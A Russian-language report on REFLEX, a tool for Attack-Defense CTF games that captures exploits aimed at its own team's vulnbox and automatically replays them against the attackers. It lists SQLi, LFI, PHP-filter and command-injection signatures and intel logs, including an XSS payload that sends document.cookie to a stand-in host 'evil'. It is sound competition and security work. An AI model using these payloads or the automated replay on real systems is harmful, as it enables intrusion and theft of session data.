# REFLEX — отчёт о проделанной работе и тестах

**Что это.** Система автоматического контр-удара для Attack-Defense CTF: пассивно
перехватывает эксплойт в трафике своего вулнбокса, атрибутирует атакующего к его
команде, подменяет flag-id на актуальный у жертвы, реплеит эксплойт по вулнбоксу
атакующего и сдаёт добытый флаг. Весь полигон поднят в Docker и протестирован
сквозным сценарием. Только Python stdlib, без `pip install`.

Дата прогона: 2026-11-04. Хост: Docker 29.9.2, Python 3.15 (контейнеры — python:3.12-alpine).

---

## Архитектура полигона

```
        gameserver 10.60.254.1  (чекер + flag-id API + submission + scoreboard)
            │ каждый тик кладёт флаг в каждый вулнбокс, публикует flag-id
            │
   ┌────────┼───────────────────────────────┐
   ▼        ▼                                 ▼
 team7     team9                           team13 = МЫ
 vulnbox   vulnbox                          vulnbox-us 10.60.13.1
 10.60.7.1 10.60.9.1                        └─ REFLEX (общий netns, sniff eth0)
   ▲        ▲                                 ▲
   │ контр-удар REFLEX (с подменой flag-id)   │ эксплойт IDOR
   │        │                                 │
 attacker7 10.60.7.37 ───────────────────────┘
 attacker9 10.60.9.37 ───────────────────────┘
   (бьют по нам со своих тачек, не с вулнбоксов)
```

**Уязвимый сервис `notes`** (одинаковый у всех команд). `POST /store` кладёт заметку,
`GET /note?id=<id>` отдаёт её **без проверки владельца** (IDOR). Чекер кладёт флаг,
его `id` публикуется как flag-id. Знаешь flag-id → читаешь флаг.

**Ключевая деталь игры:** flag-id у каждой команды свой. Эксплойт host-agnostic по телу,
но привязан к flag-id жертвы — поэтому при реплее id ОБЯЗАТЕЛЬНО подменять.

## Как устроен REFLEX (`reflex/reflex.py`)

| Слой | Реализация |
|------|-----------|
| **Захват** | raw-сокет `AF_PACKET` на `eth0` в общем netns с вулнбоксом. Пассивно, сервис не трогается, нулевая добавочная задержка. (В бою эквивалент — `iptables -j NFLOG`.) |
| **Реассембли** | per-flow буфер запрос/ответ по 4-tuple. |
| **Детект** | ответ НАШЕГО сервиса (`SELF:80`) содержит флаг (regex) **и** запрос бил по `/note` (сигнатура нашей баги) ⇒ подтверждённый успешный эксплойт. |
| **Атрибуция** | `src 10.60.N.x → жертва 10.60.N.1`. Блэклист `{13 (мы), 254 (геймсервер), 0, 255}`. |
| **Rewrite** | берём свежий flag-id жертвы у геймсервера, подставляем в `id=`. |
| **Replay** | `GET http://victim:80<path>`, вытаскиваем флаг. |
| **Submit** | `POST /submit` геймсерверу. |

**Защита своего сервака:** пассивный сниффинг (не inline-прокси) · отдельный контейнер
с лимитами cgroup (0.5 CPU / 256 МБ / 128 pids) · bounded queue + пул из 6 воркеров,
дроп при переполнении · rate-limit на жертву (он же дедуп под флудом) · таймаут 2с на
каждый коннект · circuit breaker по loadavg · блэклист инфраструктуры.

## Обучение паттернов эксплойтов

REFLEX не хардкодит эндпоинт. Фоновый поток узнаёт СВОЙ текущий flag-id у геймсервера;
при подтверждённом эксплойте находит этот flag-id в перехваченном запросе — где бы он ни
стоял — и помечает позицию как слот `{FLAGID}`. Так строится библиотека паттернов, и при
контр-ударе в слот подставляется flag-id жертвы. Работает для flag-id в query, в сегменте
пути и в теле POST.

Проверено тремя структурно разными эксплойтами (team7/9/11). REFLEX выучил все три сам:

| Паттерн | Метод | Шаблон | flag-id в | Как узнал |
|---------|-------|--------|-----------|-----------|
| P1 | GET | `/note?id={FLAGID}` | query | fallback → подтверждён |
| P2 | POST | `/lookup {"ref":"{FLAGID}"}` | **тело** | **выучен сам** |
| P3 | GET | `/v2/read/{FLAGID}` | **сегмент пути** | **выучен сам** |

P2 и P3 хардкод `id=` никогда бы не распознал. Контр-удары ACCEPTED по всем трём формам.

### Классы эксплойтов и стратегия реплея

REFLEX классифицирует технику по сигнатурам и выбирает стратегию. Триггер контр-удара
всегда один — **флаг реально утёк в ответе нашего сервиса** (ground truth). Как именно
утёк — определяет generalизацию:

| Класс | Сигнатуры | Стратегия реплея | flag-id нужен? |
|-------|-----------|------------------|----------------|
| **IDOR** | свой flag-id в запросе | подмена flag-id жертвы в слот | да |
| **SQLi** | `union select`, `' or '1'='1`, `--`, `sleep(`, `information_schema` | пейлоад **как есть** (verbatim) | нет |
| **LFI** | `../`, `/etc/passwd`, `/proc/self/`, `%00` | verbatim | нет |
| **PHP** | `php://`, `data://`, `convert.base64`, `system(` | verbatim (но base64 не даёт плейнтекст-флаг) | нет |
| **XSS** | `<script`, `onerror=`, `document.cookie` | **не контратакуем** (флаг не утекает) → intel | — |
| **cmdi** | `;id`, `` `cmd` ``, `$(...)`, `%0a` | verbatim | нет |

Проверено 2026-11-04 на 7 одновременных атакующих. REFLEX выучил 5 паттернов, из них:
`/search?q=' OR '1'='1' --` (sqli, verbatim) и `/download?file=../../../flags/current`
(lfi, verbatim) — оба без flag-id, реплей пейлоада как есть.

**SQLi-дамп даёт МНОГО флагов** (за разные тики). REFLEX сдаёт все уникальные — валидным
оказывается текущий. Пример одного удара: `flags_found=32, verdicts={ACCEPTED:1,
ERR_INVALID:28, ERR_OLD:2, ERR_DUP:1}`. Кэш уже отправленных флагов отсекает повторы
(`submit_skipped_cached=268` за прогон — ~80% сдач не ушло зря, геймсервер не завален).

### Intel-поток (Track-2): «кто чем нас щупает»

Параллельно REFLEX **пассивно классифицирует все входящие запросы** по технике — даже те,
что не утащили флаг (XSS, php-пробы, recon). Это разведка, не контр-удар: реплеить нечего.
Дедуплено по (источник, техника), окно 15с. Из прогона:
```
intel: 10.60.7.38 team7 [xss] /echo?msg=<script>document.location='http://evil/'+document.cookie</script>
intel: 10.60.9.38 team9 [php] /download?file=php://filter/convert.base64-encode/resource=flags/current
intel: 10.60.5.37 team5 [sqli] /search?q=' OR '1'='1' -- -
intel: 10.60.3.37 team3 [lfi] /download?file=../../../flags/current
```

## Тесты и результаты

### Т1. Сквозной контр-удар (три противника, три формы эксплойта)
team7 (query), team9 (path), team11 (body) воруют наши флаги. REFLEX ловит каждую атаку
и бьёт в ответ.

```
FINAL score {team7: 17, team9: 15, team11: 12, team13(МЫ): 41}
кто атаковал нас (victim=13): team7:10, team9:9, team11:7
наши контр-удары (attacker=13): по жертвам team7:10, team9:7, team11:7
```
team13 стабильно перекрывает атакующих — **отражается каждая атака всех троих**. ✅

### Т1b. Флаг атаковавшей команды реально получен и засчитан НАМ (жёсткая проверка)
Для каждого контр-удара независимо спросили геймсервер `/flagowner?flag=<точное значение>`:
```
QHMFLX94DPWNHG.. засчитан нам как флаг team9  | владелец по геймсерверу team9  => MATCH
JPRVUKH72G348B.. засчитан нам как флаг team7  | владелец по геймсерверу team7  => MATCH
NBCIS5L69GIXRS.. засчитан нам как флаг team11 | владелец по геймсерверу team11 => MATCH
...
ИТОГ по всем контр-ударам: MATCH=10  MISMATCH=0  истекли=21 (grace)
```
Ноль расхождений: каждый сданный нами флаг реально принадлежит атаковавшей команде, и очко
ушло нам (attacker_team=13). Истёкшие — старые флаги, вычищенные из памяти геймсервера; в
момент сдачи они были ACCEPTED (а значит прошли проверку владельца и «не свой флаг»). ✅

### Т1c. Чекер успешно забирает флаги (SLA)
```
sla=OK ×19/19  по всем командам (7/9/11/13) за время прогона; sla=DOWN: 0
```
Чекер кладёт флаг и тут же читает его обратно — чтение проходит по всем боксам. ✅

### Т2. Подмена flag-id обязательна
Прямой тест «наивный реплей vs умный»:
```
naive replay (наш id -> team7):   HTTP 404 Not Found      ← флага нет
smart replay (id team7 -> team7): FLAG SF4Z619I3RTS..     ← флаг есть
```
Без подмены flag-id контр-удар возвращает пустоту. Это шаг, который большинство
реализаций «hack-back» пропускают. ✅

### Т3. Блэклист инфраструктуры (негативный тест)
Чекер каждый тик сам читает наш флаг (`GET /note?id=` с `10.60.254.1`). Этот ответ
тоже содержит флаг, но источник — геймсервер.
```
skip_blacklist client=10.60.254.1 team=254   (×24 за прогон)
blacklisted_skips: 24
```
REFLEX **ни разу** не выстрелил по инфраструктуре. ✅

### Т4. Задержка своего сервиса (пассивность захвата)
```
baseline (REFLEX on, атаки нет):  n=500 ok=500  p50=0.75ms p90=0.84ms p99=0.92ms
под флудом 100 эксплойтов/с:       n=800 ok=800  p50=2.00ms p90=2.59ms p99=3.25ms
```
100% запросов обслужено, p99 < 3.3мс даже под флудом. Рост — от самих запросов
атакующего к сервису, не от REFLEX (он пассивен). ✅

### Т5. Защита ресурсов под флудом (100 эксплойтов/с)
```
reflex stats: confirmed_exploits=2187  rate_limited=2112  enqueued=51  queue=0  drops=0
cgroup limit: 0.5 CPU / 256 МБ / 128 pids
фактически:   CPU 5.73%,  RAM 16.5 МБ
```
Rate-limit поглотил 2112 из 2187 попыток, в работу ушёл 51 удар, очередь пустая,
дропов нет, runaway нет. REFLEX не приблизился к лимитам. ✅

### Т6. Многоклассовый прогон (7 атакующих: idor×3, sqli, lfi, xss, php)
```
SCORE {team3:34, team5:0, team7:45, team9:38, team11:30, team13(МЫ):163}
контр-ударов засчитано нам: 163  по жертвам {3,5,7,9,11} — все классы
```

эффективнее наивного атакующего. ✅

## Минимальная настройка перед развёртыванием

REFLEX выводит номер команды и базу сети из `SELF_IP`. Для боя нужно задать по сути две
переменные:

```yaml
environment:
  SELF_IP: "10.60.<ВАШ_НОМЕР>.1"   # IP вашего вулнбокса в игровой сети
  GS:      "<submission/flagids host>"  # эндпоинт геймсервера лиги
  # опционально: SERVICE_PORT, IFACE(eth0), WORKERS, RL_INTERVAL, QUEUE_MAX, LOAD_MAX
```
Блэклист инфраструктуры (`SELF_TEAM, 254, 0, 255`) и маппинг `src→жертва` (`10.60.N.x →
10.60.N.1`) задаются из `NET_BASE`/топологии — под свою лигу правится в одном месте вверху
`reflex.py`. Запуск — в своём контейнере с лимитами cgroup (уже в compose).

## Воспроизведение

```bash
cd ~/Work/reflex
docker compose build
docker compose up -d gameserver vulnbox-us vulnbox7 vulnbox9 reflex   # инфра
docker compose run --rm probe                                          # базовая задержка
docker compose up -d attacker7 attacker9                               # атака + контр-удар
docker compose exec gameserver wget -qO- http://127.0.0.1/scoreboard   # счёт
docker compose logs -f reflex                                          # контр-удары/статистика
docker compose down                                                    # снести
```

Флуд-режим: `docker compose run -d -e PERIOD=0.2 -e BURST=20 attacker7`.

## Ограничения и шаг в бой

- **Реассембли TCP упрощённая** (append по порядку прихода) — хватает для single-shot
  эксплойтов на LAN. Многошаговые/stateful эксплойты требуют обобщённого эксплойта,
  а не сырого реплея — это следующий слой.
- **XSS и base64-обёрнутый exfil не контратакуются.** Это честное ограничение, а не баг:
  reflected XSS не отдаёт флаг сервером, а `php://filter base64` отдаёт не плейнтекст —
  ground-truth-триггера «флаг в ответе» нет. Такое попадает в intel-поток (разведка),
  но не в реплей. Чтобы ловить base64/url-обёртки — добавить декодеры в extractor.
- **Классификатор техник эвристический** (сигнатуры). Для intel это норма (ложные
  срабатывания терпимы). Для контр-удара защищает ground truth: реплеим только то, что
  реально утащило флаг, даже если тег техники ошибочен.
- **Детект** — основной триггер «флаг в исходящем ответе» + автоопределение паттерна
  (поиск своего flag-id в запросе). Это снимает привязку к эндпоинту: ловит query, path
  и body-эксплойты. `/note` остался лишь фолбэком на время прогрева библиотеки паттернов.
- **AF_PACKET для демо; в бою — NFLOG** (`iptables -j NFLOG`), эквивалент по пассивности.
- **Правила лиги.** Контр-удар по чужим вулнбоксам легален (это и есть игра), но
  стрелять по чекеру/геймсерверу нельзя — блэклист это гарантирует. Схему IP и список
  инфраструктуры надо подставить под конкретную лигу (RuCTF/ENOWARS/FaustCTF).
